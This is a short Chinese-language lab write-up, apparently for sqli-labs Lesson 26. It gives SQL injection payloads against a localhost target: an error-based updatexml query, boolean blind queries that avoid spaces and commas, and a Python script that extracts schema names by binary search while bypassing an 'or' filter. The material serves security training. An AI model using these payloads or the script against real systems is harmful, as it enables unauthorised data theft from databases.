# Lesson-26
```
报错注入-,-Bool盲注-,-利用SQL语法绕过空格过滤
```

利用报错注入证明可以dump数据
```
http://127.0.0.1/Less-26/?id=0%27||(updatexml(1,concat(0x5e,version(),0x5e),1))||%27%27=%27dsa
```
重新利用明注脚本批量跑
这个好叼
```
select(mid(user()from(4)for(1)))
```
没有空格 , 没有逗号
```
select(schema_name)from(information_schema.schemata)
```
这样也没有空格
然后结合一下
```
select(mid((concat((select(group_concat(username))from(users))))from(7)for(1)));
```
只需要修改中间的select和from后面的偏移就可以dump数据
```
select(ascii(mid((concat((select(group_concat(username))from(users))))from(7)for(1)))>255);
```
这样就可以盲注
```
select(ascii(mid((concat((select(group_concat(schema_name))from(information_schema.schemata))))from(7)for(1)))<255);
```
测试一下 :
```
#!/usr/bin/env python
# encoding:utf8

import requests
import time
import sys

# config-start
sleep_time = 5
error_time = 1
# config-end

def getPayload(indexOfChar, mid):
	column_name="schema_name"
	table_name="schemata"
	database_name="information_schema"
	startStr = "0'||("
	endStr = ")||'1'='"
	payload = "select(ascii(mid((concat((select(group_concat(" + column_name + "))from(" + database_name + "." + table_name + "))))from(" + indexOfChar + ")for(1)))>" + mid + ")"
	payload = startStr + payload + endStr
	# 绕过对or的过滤
	payload = payload.replace("or","oorr")
	return payload

def exce(indexOfChar,mid):
	# content-start
	url = "http://127.0.0.1/Less-26/?id="
	tempurl = url + getPayload(indexOfChar,mid)
	content = requests.get(tempurl).text
	# content-end
	# judge-start
	if "Your Login name:" in content:
		return True
	else:
		return False
	# judge-end

def doubleSearch(indexOfChar,left_number, right_number):
	while left_number < right_number:
		mid = int((left_number + right_number) / 2)
		if exce(str(indexOfChar + 1),str(mid)):
			left_number = mid
		else:
			right_number = mid
		if left_number == right_number - 1:
			if exce(str(indexOfChar + 1),str(mid)):
				mid += 1
				break
			else:
				break
	return chr(mid)

def search():
	for j in range(1024): # 结果的长度
		temp = doubleSearch(j, 0, 128) # 从255开始查询
		if ord(temp) == 1: # 当为1的时候说明已经查询结束
		    break
		if temp == ",":
			print ""
		else:
			sys.stdout.write(temp)
			sys.stdout.flush()
	print ""

search()
```
